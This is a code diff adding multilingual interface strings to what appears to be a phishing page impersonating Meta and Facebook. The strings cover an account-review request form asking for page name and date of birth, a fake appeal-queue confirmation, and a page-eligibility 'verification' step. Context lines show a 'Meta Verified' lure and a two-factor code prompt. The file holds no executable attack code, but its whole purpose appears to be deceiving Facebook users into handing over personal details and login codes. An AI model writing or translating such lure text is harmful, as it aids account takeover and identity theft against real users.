@@ -155,6 +155,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'and': 'and',
         'Terms of Use': 'Terms of Use',
         'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.': 'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
+        // Init Modal
+        'Request Review': 'Request Review',
+        'Please provide the information below to help us review your account.': 'Please provide the information below to help us review your account.',
+        'Page Name': 'Page Name',
+        'Date of birth': 'Date of birth',
+        'Day': 'Day',
+        'Month': 'Month',
+        'Year': 'Year',
+        // Final Modal
+        'Request has been sent': 'Request has been sent',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.',
+        'Return on Facebook': 'Return on Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Confirm Page Information',
+        'Your page meets the eligibility requirements': 'Your page meets the eligibility requirements',
+        'Submit Application': 'Submit Application',
+        'Under Review': 'Under Review',
     },
     vi: {
         'Upgrade your profile with Meta Verified — enjoy exclusive benefits.': 'Nâng cấp hồ sơ của bạn với Meta Verified — tận hưởng các quyền lợi độc quyền.',
@@ -272,6 +289,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Mã xác thực',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Mã xác thực hai yếu tố bạn nhập không chính xác. Vui lòng thử lại sau',
         'Continue': 'Tiếp tục',
+        // Init Modal
+        'Request Review': 'Yêu cầu xem xét',
+        'Please provide the information below to help us review your account.': 'Vui lòng cung cấp thông tin bên dưới để giúp chúng tôi xem xét tài khoản của bạn.',
+        'Page Name': 'Tên trang',
+        'Date of birth': 'Ngày sinh',
+        'Day': 'Ngày',
+        'Month': 'Tháng',
+        'Year': 'Năm',
+        // Final Modal
+        'Request has been sent': 'Yêu cầu đã được gửi',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Yêu cầu của bạn đã được thêm vào hàng đợi xử lý. Chúng tôi sẽ xử lý yêu cầu của bạn trong vòng 24 giờ. Nếu bạn không nhận được email về trạng thái kháng cáo trong vòng 24 giờ, vui lòng gửi lại kháng cáo.',
+        'Return on Facebook': 'Quay lại Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Xác nhận thông tin trang',
+        'Your page meets the eligibility requirements': 'Trang của bạn đủ điều kiện',
+        'Submit Application': 'Gửi đơn đăng ký',
+        'Under Review': 'Đang xem xét',
     },
     // Spanish
     es: {
@@ -393,7 +427,24 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'Política de Privacidad',
         'Terms of Use': 'Términos de Uso',
         'and': 'y',
-        'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.': 'reCAPTCHA Enterprise recopila información de hardware y software, como datos de dispositivos y aplicaciones, y la envía a Google para proporcionar, mantener y mejorar reCAPTCHA Enterprise y para propósitos generales de seguridad. Google no utiliza esta información para publicidad personalizada.'
+        'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.': 'reCAPTCHA Enterprise recopila información de hardware y software, como datos de dispositivos y aplicaciones, y la envía a Google para proporcionar, mantener y mejorar reCAPTCHA Enterprise y para propósitos generales de seguridad. Google no utiliza esta información para publicidad personalizada.',
+        // Init Modal
+        'Request Review': 'Solicitar Revisión',
+        'Please provide the information below to help us review your account.': 'Proporcione la información a continuación para ayudarnos a revisar su cuenta.',
+        'Page Name': 'Nombre de la Página',
+        'Date of birth': 'Fecha de nacimiento',
+        'Day': 'Día',
+        'Month': 'Mes',
+        'Year': 'Año',
+        // Final Modal
+        'Request has been sent': 'La solicitud ha sido enviada',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Su solicitud ha sido añadida a la cola de procesamiento. Procesaremos su solicitud en 24 horas. Si no recibe un correo con el estado de la apelación en 24 horas, reenvíe la apelación.',
+        'Return on Facebook': 'Volver a Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Confirmar información de la página',
+        'Your page meets the eligibility requirements': 'Su página cumple los requisitos de elegibilidad',
+        'Submit Application': 'Enviar solicitud',
+        'Under Review': 'En revisión',
     },
     fr: {
         'Upgrade your profile with Meta Verified — enjoy exclusive benefits.': 'Améliorez votre profil avec Meta Verified — profitez d\'avantages exclusifs.',
@@ -505,6 +556,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Code',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Le code d\'authentification à deux facteurs que vous avez saisi est incorrect. Veuillez réessayer après',
         'Continue': 'Continuer',
+        // Init Modal
+        'Request Review': 'Demander un examen',
+        'Please provide the information below to help us review your account.': 'Veuillez fournir les informations ci-dessous pour nous aider à examiner votre compte.',
+        'Page Name': 'Nom de la Page',
+        'Date of birth': 'Date de naissance',
+        'Day': 'Jour',
+        'Month': 'Mois',
+        'Year': 'Année',
+        // Final Modal
+        'Request has been sent': 'La demande a été envoyée',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Votre demande a été ajoutée à la file de traitement. Nous traiterons votre demande dans les 24 heures. Si vous ne recevez pas de message indiquant le statut de l\'appel dans les 24 heures, veuillez renvoyer l\'appel.',
+        'Return on Facebook': 'Retourner sur Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Confirmer les informations de la page',
+        'Your page meets the eligibility requirements': 'Votre page répond aux critères d\'éligibilité',
+        'Submit Application': 'Soumettre la demande',
+        'Under Review': 'En cours d\'examen',
     },
     // German
     de: {
@@ -616,6 +684,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Code',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Der Zwei-Faktor-Authentifizierungscode, den Sie eingegeben haben, ist falsch. Bitte versuchen Sie es nach',
         'Continue': 'Fortfahren',
+        // Init Modal
+        'Request Review': 'Überprüfung anfordern',
+        'Please provide the information below to help us review your account.': 'Bitte geben Sie die folgenden Informationen an, um uns bei der Überprüfung Ihres Kontos zu helfen.',
+        'Page Name': 'Seitenname',
+        'Date of birth': 'Geburtsdatum',
+        'Day': 'Tag',
+        'Month': 'Monat',
+        'Year': 'Jahr',
+        // Final Modal
+        'Request has been sent': 'Anfrage wurde gesendet',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Ihre Anfrage wurde in die Warteschlange aufgenommen. Wir bearbeiten Ihre Anfrage innerhalb von 24 Stunden. Wenn Sie keine E-Mail zum Status des Einspruchs erhalten, senden Sie den Einspruch erneut.',
+        'Return on Facebook': 'Zurück zu Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Seiteninformationen bestätigen',
+        'Your page meets the eligibility requirements': 'Ihre Seite erfüllt die Zulassungsvoraussetzungen',
+        'Submit Application': 'Antrag einreichen',
+        'Under Review': 'Wird überprüft',
     },
     ja: {
         'Upgrade your profile with Meta Verified — enjoy exclusive benefits.': 'Meta認証でプロフィールをアップグレード — 限定特典をお楽しみください。',
@@ -690,6 +775,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'プライバシーポリシー',
         'Terms of Service': 'サービス利用規約',
         'Community Standards': 'コミュニティスタンダード',
+        // Init Modal
+        'Request Review': 'レビューをリクエスト',
+        'Please provide the information below to help us review your account.': '以下の情報をご提供ください。アカウントの審査に役立てます。',
+        'Page Name': 'ページ名',
+        'Date of birth': '生年月日',
+        'Day': '日',
+        'Month': '月',
+        'Year': '年',
+        // Final Modal
+        'Request has been sent': 'リクエストが送信されました',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'リクエストは処理キューに追加されました。24時間以内に処理します。24時間以内に異議申し立てのステータスに関するメールが届かない場合は、もう一度送信してください。',
+        'Return on Facebook': 'Facebookに戻る',
+        // Verify Info Modal
+        'Confirm Page Information': 'ページ情報を確認',
+        'Your page meets the eligibility requirements': 'あなたのページは資格要件を満たしています',
+        'Submit Application': '申請を送信',
+        'Under Review': '審査中',
     },
     zh: {
         'Upgrade your profile with Meta Verified — enjoy exclusive benefits.': '使用Meta认证升级您的个人资料 — 享受独家福利。',
@@ -804,6 +906,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': '隐私政策',
         'Terms of Service': '服务条款',
         'Community Standards': '社区标准',
+        // Init Modal
+        'Request Review': '请求审核',
+        'Please provide the information below to help us review your account.': '请提供以下信息，以帮助我们审核您的帐户。',
+        'Page Name': '页面名称',
+        'Date of birth': '出生日期',
+        'Day': '日',
+        'Month': '月',
+        'Year': '年',
+        // Final Modal
+        'Request has been sent': '请求已发送',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': '您的请求已添加到处理队列。我们将在24小时内处理您的请求。如果您在24小时内未收到有关申诉状态的电子邮件，请重新发送申诉。',
+        'Return on Facebook': '返回Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': '确认页面信息',
+        'Your page meets the eligibility requirements': '您的页面符合资格要求',
+        'Submit Application': '提交申请',
+        'Under Review': '审核中',
     },
     ko: {
         'Upgrade your profile with Meta Verified — enjoy exclusive benefits.': 'Meta 인증으로 프로필 업그레이드 — 독점 혜택을 누리세요.',
@@ -917,6 +1036,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': '개인정보보호 정책',
         'Terms of Service': '서비스 약관',
         'Community Standards': '커뮤니티 기준',
+        // Init Modal
+        'Request Review': '검토 요청',
+        'Please provide the information below to help us review your account.': '계정 검토를 위해 아래 정보를 제공해 주세요.',
+        'Page Name': '페이지 이름',
+        'Date of birth': '생년월일',
+        'Day': '일',
+        'Month': '월',
+        'Year': '년',
+        // Final Modal
+        'Request has been sent': '요청이 전송되었습니다',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': '요청이 처리 대기열에 추가되었습니다. 24시간 이내에 처리하겠습니다. 24시간 이내에 이의 제기 상태에 대한 이메일이 수신되지 않으면 이의를 다시 제출해 주세요.',
+        'Return on Facebook': 'Facebook으로 돌아가기',
+        // Verify Info Modal
+        'Confirm Page Information': '페이지 정보 확인',
+        'Your page meets the eligibility requirements': '페이지가 자격 요건을 충족합니다',
+        'Submit Application': '신청서 제출',
+        'Under Review': '검토 중',
     },
     // Portuguese
     pt: {
@@ -1027,6 +1163,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Código',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'O código de autenticação de dois fatores que você inseriu está incorreto. Por favor, tente novamente após',
         'Continue': 'Continuar',
+        // Init Modal
+        'Request Review': 'Solicitar Revisão',
+        'Please provide the information below to help us review your account.': 'Forneça as informações abaixo para nos ajudar a analisar sua conta.',
+        'Page Name': 'Nome da Página',
+        'Date of birth': 'Data de nascimento',
+        'Day': 'Dia',
+        'Month': 'Mês',
+        'Year': 'Ano',
+        // Final Modal
+        'Request has been sent': 'Solicitação enviada',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Sua solicitação foi adicionada à fila de processamento. Processaremos sua solicitação em 24 horas. Se você não receber um e-mail com o status da apelação em 24 horas, reenvie a apelação.',
+        'Return on Facebook': 'Voltar ao Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Confirmar informações da página',
+        'Your page meets the eligibility requirements': 'Sua página atende aos requisitos de elegibilidade',
+        'Submit Application': 'Enviar candidatura',
+        'Under Review': 'Em análise',
     },
     // Thai
     th: {
@@ -1111,6 +1264,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'นโยบายความเป็นส่วนตัว',
         'Terms of Service': 'เงื่อนไขการบริการ',
         'Community Standards': 'มาตรฐานชุมชน',
+        // Init Modal
+        'Request Review': 'ขอการตรวจสอบ',
+        'Please provide the information below to help us review your account.': 'กรุณาให้ข้อมูลด้านล่างเพื่อช่วยเราตรวจสอบบัญชีของคุณ',
+        'Page Name': 'ชื่อเพจ',
+        'Date of birth': 'วันเกิด',
+        'Day': 'วัน',
+        'Month': 'เดือน',
+        'Year': 'ปี',
+        // Final Modal
+        'Request has been sent': 'ส่งคำขอแล้ว',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'คำขอของคุณถูกเพิ่มในคิวการประมวลผล เราจะดำเนินการภายใน 24 ชั่วโมง หากคุณไม่ได้รับอีเมลเกี่ยวกับสถานะการอุทธรณ์ภายใน 24 ชั่วโมง โปรดส่งอุทธรณ์อีกครั้ง',
+        'Return on Facebook': 'กลับไปที่ Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'ยืนยันข้อมูลเพจ',
+        'Your page meets the eligibility requirements': 'เพจของคุณผ่านเกณฑ์คุณสมบัติ',
+        'Submit Application': 'ส่งใบสมัคร',
+        'Under Review': 'กำลังตรวจสอบ',
     },
     // Indonesian
     id: {
@@ -1200,6 +1370,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'Kebijakan Privasi',
         'Terms of Service': 'Persyaratan Layanan',
         'Community Standards': 'Standar Komunitas',
+        // Init Modal
+        'Request Review': 'Minta Peninjauan',
+        'Please provide the information below to help us review your account.': 'Berikan informasi di bawah ini untuk membantu kami meninjau akun Anda.',
+        'Page Name': 'Nama Halaman',
+        'Date of birth': 'Tanggal lahir',
+        'Day': 'Hari',
+        'Month': 'Bulan',
+        'Year': 'Tahun',
+        // Final Modal
+        'Request has been sent': 'Permintaan telah dikirim',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Permintaan Anda telah ditambahkan ke antrean pemrosesan. Kami akan memproses permintaan Anda dalam 24 jam. Jika Anda tidak menerima email tentang status banding dalam 24 jam, silakan kirim ulang banding.',
+        'Return on Facebook': 'Kembali ke Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Konfirmasi informasi halaman',
+        'Your page meets the eligibility requirements': 'Halaman Anda memenuhi persyaratan kelayakan',
+        'Submit Application': 'Kirim aplikasi',
+        'Under Review': 'Sedang ditinjau',
     },
     // Arabic
     ar: {
@@ -1289,6 +1476,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'سياسة الخصوصية',
         'Terms of Service': 'شروط الخدمة',
         'Community Standards': 'معايير المجتمع',
+        // Init Modal
+        'Request Review': 'طلب مراجعة',
+        'Please provide the information below to help us review your account.': 'يرجى تقديم المعلومات أدناه لمساعدتنا في مراجعة حسابك.',
+        'Page Name': 'اسم الصفحة',
+        'Date of birth': 'تاريخ الميلاد',
+        'Day': 'يوم',
+        'Month': 'شهر',
+        'Year': 'سنة',
+        // Final Modal
+        'Request has been sent': 'تم إرسال الطلب',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'تمت إضافة طلبك إلى قائمة المعالجة. سنعالج طلبك خلال 24 ساعة. إذا لم تتلق رسالة بريد إلكتروني بحالة الاستئناف خلال 24 ساعة، يرجى إعادة إرسال الاستئناف.',
+        'Return on Facebook': 'العودة إلى فيسبوك',
+        // Verify Info Modal
+        'Confirm Page Information': 'تأكيد معلومات الصفحة',
+        'Your page meets the eligibility requirements': 'صفحتك تستوفي متطلبات الأهلية',
+        'Submit Application': 'إرسال الطلب',
+        'Under Review': 'قيد المراجعة',
     },
     // Russian
     ru: {
@@ -1401,6 +1605,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'Политика конфиденциальности',
         'Terms of Service': 'Условия обслуживания',
         'Community Standards': 'Стандарты сообщества',
+        // Init Modal
+        'Request Review': 'Запросить проверку',
+        'Please provide the information below to help us review your account.': 'Пожалуйста, предоставьте информацию ниже, чтобы помочь нам проверить ваш аккаунт.',
+        'Page Name': 'Название страницы',
+        'Date of birth': 'Дата рождения',
+        'Day': 'День',
+        'Month': 'Месяц',
+        'Year': 'Год',
+        // Final Modal
+        'Request has been sent': 'Запрос отправлен',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Ваш запрос добавлен в очередь обработки. Мы обработаем ваш запрос в течение 24 часов. Если вы не получите письмо о статусе апелляции в течение 24 часов, отправьте апелляцию повторно.',
+        'Return on Facebook': 'Вернуться на Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Подтвердить информацию о странице',
+        'Your page meets the eligibility requirements': 'Ваша страница соответствует требованиям',
+        'Submit Application': 'Отправить заявку',
+        'Under Review': 'На рассмотрении',
     },
     // Ukrainian
     uk: {
@@ -1513,6 +1734,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'Політика конфіденційності',
         'Terms of Service': 'Умови обслуговування',
         'Community Standards': 'Стандарти спільноти',
+        // Init Modal
+        'Request Review': 'Запит на перегляд',
+        'Please provide the information below to help us review your account.': 'Будь ласка, надайте інформацію нижче, щоб допомогти нам перевірити ваш обліковий запис.',
+        'Page Name': 'Назва сторінки',
+        'Date of birth': 'Дата народження',
+        'Day': 'День',
+        'Month': 'Місяць',
+        'Year': 'Рік',
+        // Final Modal
+        'Request has been sent': 'Запит надіслано',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Ваш запит додано в чергу обробки. Ми опрацюємо ваш запит протягом 24 годин. Якщо ви не отримаєте електронного листа про статус апеляції протягом 24 годин, надішліть апеляцію повторно.',
+        'Return on Facebook': 'Повернутися на Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Підтвердити інформацію про сторінку',
+        'Your page meets the eligibility requirements': 'Ваша сторінка відповідає вимогам',
+        'Submit Application': 'Подати заявку',
+        'Under Review': 'На розгляді',
     },
     // Hindi
     hi: {
@@ -1626,6 +1864,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'गोपनीयता नीति',
         'Terms of Service': 'सेवा की शर्तें',
         'Community Standards': 'समुदाय मानदंड',
+        // Init Modal
+        'Request Review': 'समीक्षा का अनुरोध करें',
+        'Please provide the information below to help us review your account.': 'कृपया अपने खाते की समीक्षा में हमारी मदद करने के लिए नीचे दी गई जानकारी प्रदान करें।',
+        'Page Name': 'पेज का नाम',
+        'Date of birth': 'जन्म तिथि',
+        'Day': 'दिन',
+        'Month': 'महीना',
+        'Year': 'वर्ष',
+        // Final Modal
+        'Request has been sent': 'अनुरोध भेज दिया गया है',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'आपका अनुरोध प्रोसेसिंग कतार में जोड़ दिया गया है। हम 24 घंटे के भीतर आपके अनुरोध पर कार्रवाई करेंगे। यदि आपको 24 घंटे के भीतर अपील की स्थिति के बारे में ईमेल प्राप्त नहीं होता है, तो कृपया अपील दोबारा भेजें।',
+        'Return on Facebook': 'Facebook पर वापस जाएं',
+        // Verify Info Modal
+        'Confirm Page Information': 'पेज की जानकारी की पुष्टि करें',
+        'Your page meets the eligibility requirements': 'आपका पेज पात्रता आवश्यकताओं को पूरा करता है',
+        'Submit Application': 'आवेदन जमा करें',
+        'Under Review': 'समीक्षा में',
     },
     // Bengali
     bn: {
@@ -1738,6 +1993,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Privacy Policy': 'গোপনীয়তা নীতি',
         'Terms of Service': 'সেবার শর্তাবলী',
         'Community Standards': 'সম্প্রদায় মানদণ্ড',
+        // Init Modal
+        'Request Review': 'পর্যালোচনার অনুরোধ',
+        'Please provide the information below to help us review your account.': 'আপনার অ্যাকাউন্ট পর্যালোচনা করতে সাহায্য করার জন্য নিচের তথ্য প্রদান করুন।',
+        'Page Name': 'পেজের নাম',
+        'Date of birth': 'জন্ম তারিখ',
+        'Day': 'দিন',
+        'Month': 'মাস',
+        'Year': 'বছর',
+        // Final Modal
+        'Request has been sent': 'অনুরোধ পাঠানো হয়েছে',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'আপনার অনুরোধ প্রক্রিয়াকরণ সারিতে যোগ করা হয়েছে। আমরা ২৪ ঘণ্টার মধ্যে আপনার অনুরোধ প্রক্রিয়া করব। যদি আপনি ২৪ ঘণ্টার মধ্যে আপিলের স্থিতি সম্পর্কে ইমেল না পান, অনুগ্রহ করে আবার আপিল পাঠান।',
+        'Return on Facebook': 'Facebook-এ ফিরে যান',
+        // Verify Info Modal
+        'Confirm Page Information': 'পেজের তথ্য নিশ্চিত করুন',
+        'Your page meets the eligibility requirements': 'আপনার পেজ যোগ্যতার প্রয়োজনীয়তা পূরণ করে',
+        'Submit Application': 'আবেদন জমা দিন',
+        'Under Review': 'পর্যালোচনাধীন',
     },
     // Italian
     it: {
@@ -1851,6 +2123,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Codice',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'L\'autenticazione a due fattori inserita è errata. Per favore, riprova tra',
         'Continue': 'Continua',
+        // Init Modal
+        'Request Review': 'Richiedi revisione',
+        'Please provide the information below to help us review your account.': 'Fornisci le informazioni seguenti per aiutarci a esaminare il tuo account.',
+        'Page Name': 'Nome della Pagina',
+        'Date of birth': 'Data di nascita',
+        'Day': 'Giorno',
+        'Month': 'Mese',
+        'Year': 'Anno',
+        // Final Modal
+        'Request has been sent': 'La richiesta è stata inviata',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'La tua richiesta è stata aggiunta alla coda di elaborazione. Elaboreremo la tua richiesta entro 24 ore. Se non ricevi un messaggio sullo stato del ricorso entro 24 ore, invia nuovamente il ricorso.',
+        'Return on Facebook': 'Torna su Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Conferma informazioni della pagina',
+        'Your page meets the eligibility requirements': 'La tua pagina soddisfa i requisiti di idoneità',
+        'Submit Application': 'Invia domanda',
+        'Under Review': 'In revisione',
     },
     // Polish
     pl: {
@@ -1964,6 +2253,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Kod',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Wpisane uwierzytelnianie dwuskładnikowe jest nieprawidłowe. Spróbuj ponownie za',
         'Continue': 'Dalej',
+        // Init Modal
+        'Request Review': 'Poproś o weryfikację',
+        'Please provide the information below to help us review your account.': 'Podaj poniższe informacje, aby pomóc nam zweryfikować Twoje konto.',
+        'Page Name': 'Nazwa strony',
+        'Date of birth': 'Data urodzenia',
+        'Day': 'Dzień',
+        'Month': 'Miesiąc',
+        'Year': 'Rok',
+        // Final Modal
+        'Request has been sent': 'Prośba została wysłana',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Twoja prośba została dodana do kolejki przetwarzania. Przetworzymy Twoje zgłoszenie w ciągu 24 godzin. Jeśli nie otrzymasz wiadomości e-mail o statusie odwołania w ciągu 24 godzin, wyślij odwołanie ponownie.',
+        'Return on Facebook': 'Wróć na Facebooka',
+        // Verify Info Modal
+        'Confirm Page Information': 'Potwierdź informacje o stronie',
+        'Your page meets the eligibility requirements': 'Twoja strona spełnia wymagania kwalifikacyjne',
+        'Submit Application': 'Złóż wniosek',
+        'Under Review': 'W trakcie weryfikacji',
     },
     // Dutch
     nl: {
@@ -2077,6 +2383,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Code',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'De twee-factor-verificatiecode die u heeft ingevoerd, is onjuist. Probeer het opnieuw na',
         'Continue': 'Doorgaan',
+        // Init Modal
+        'Request Review': 'Beoordeling aanvragen',
+        'Please provide the information below to help us review your account.': 'Geef de onderstaande informatie op om ons te helpen uw account te beoordelen.',
+        'Page Name': 'Paginanaam',
+        'Date of birth': 'Geboortedatum',
+        'Day': 'Dag',
+        'Month': 'Maand',
+        'Year': 'Jaar',
+        // Final Modal
+        'Request has been sent': 'Verzoek is verzonden',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Uw verzoek is toegevoegd aan de verwerkingswachtrij. We verwerken uw verzoek binnen 24 uur. Als u binnen 24 uur geen e-mail ontvangt over de status van het beroep, dien het beroep dan opnieuw in.',
+        'Return on Facebook': 'Terug naar Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Pagina-informatie bevestigen',
+        'Your page meets the eligibility requirements': 'Uw pagina voldoet aan de geschiktheidseisen',
+        'Submit Application': 'Aanvraag indienen',
+        'Under Review': 'Wordt beoordeeld',
     },
     // Turkish
     tr: {
@@ -2190,6 +2513,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Kod',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Girdiğiniz iki faktörlü kimlik doğrulama kodu hatalı. Lütfen sonra tekrar deneyin',
         'Continue': 'Devam et',
+        // Init Modal
+        'Request Review': 'İnceleme Talep Et',
+        'Please provide the information below to help us review your account.': 'Hesabınızı incelememize yardımcı olması için aşağıdaki bilgileri sağlayın.',
+        'Page Name': 'Sayfa Adı',
+        'Date of birth': 'Doğum tarihi',
+        'Day': 'Gün',
+        'Month': 'Ay',
+        'Year': 'Yıl',
+        // Final Modal
+        'Request has been sent': 'Talep gönderildi',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Talebiniz işlem kuyruğuna eklendi. Talebinizi 24 saat içinde işleyeceğiz. 24 saat içinde itiraz durumuna ilişkin bir e-posta almazsanız, lütfen itirazı tekrar gönderin.',
+        'Return on Facebook': 'Facebook\'a Dön',
+        // Verify Info Modal
+        'Confirm Page Information': 'Sayfa bilgilerini onayla',
+        'Your page meets the eligibility requirements': 'Sayfanız uygunluk gereksinimlerini karşılıyor',
+        'Submit Application': 'Başvuruyu Gönder',
+        'Under Review': 'İnceleniyor',
     },
     // Greek
     el: {
@@ -2303,6 +2643,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Κωδικός',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Η δύο συντελεστική ταυτοποίηση που εισάγατε είναι λανθασμένη. Προσπαθήστε ξανά μετά',
         'Continue': 'Συνεχίστε',
+        // Init Modal
+        'Request Review': 'Αίτημα αναθεώρησης',
+        'Please provide the information below to help us review your account.': 'Παρακαλούμε δώστε τις παρακάτω πληροφορίες για να μας βοηθήσετε να ελέγξουμε τον λογαριασμό σας.',
+        'Page Name': 'Όνομα σελίδας',
+        'Date of birth': 'Ημερομηνία γέννησης',
+        'Day': 'Ημέρα',
+        'Month': 'Μήνας',
+        'Year': 'Έτος',
+        // Final Modal
+        'Request has been sent': 'Το αίτημα εστάλη',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Το αίτημά σας προστέθηκε στην ουρά επεξεργασίας. Θα επεξεργαστούμε το αίτημά σας εντός 24 ωρών. Αν δεν λάβετε email σχετικά με την κατάσταση της έφεσης εντός 24 ωρών, στείλτε ξανά την έφεση.',
+        'Return on Facebook': 'Επιστροφή στο Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Επιβεβαίωση πληροφοριών σελίδας',
+        'Your page meets the eligibility requirements': 'Η σελίδα σας πληροί τις προϋποθέσεις επιλεξιμότητας',
+        'Submit Application': 'Υποβολή αίτησης',
+        'Under Review': 'Υπό εξέταση',
     },
     // Swedish
     sv: {
@@ -2417,6 +2774,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Kod',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Den tvåfaktorsautentiseringskod du angav är felaktig. Försök igen efter',
         'Continue': 'Fortsätt',
+        // Init Modal
+        'Request Review': 'Begär granskning',
+        'Please provide the information below to help us review your account.': 'Ange informationen nedan för att hjälpa oss granska ditt konto.',
+        'Page Name': 'Sidnamn',
+        'Date of birth': 'Födelsedatum',
+        'Day': 'Dag',
+        'Month': 'Månad',
+        'Year': 'År',
+        // Final Modal
+        'Request has been sent': 'Begäran har skickats',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Din begäran har lagts till i bearbetningskön. Vi behandlar din begäran inom 24 timmar. Om du inte får ett e-postmeddelande om överklagandestausen inom 24 timmar, skicka överklagandet igen.',
+        'Return on Facebook': 'Tillbaka till Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Bekräfta sidinformation',
+        'Your page meets the eligibility requirements': 'Din sida uppfyller behörighetskraven',
+        'Submit Application': 'Skicka ansökan',
+        'Under Review': 'Under granskning',
     },
     // Norwegian
     no: {
@@ -2531,6 +2905,23 @@ const translations: Record<LangKey, Record<string, string>> = {
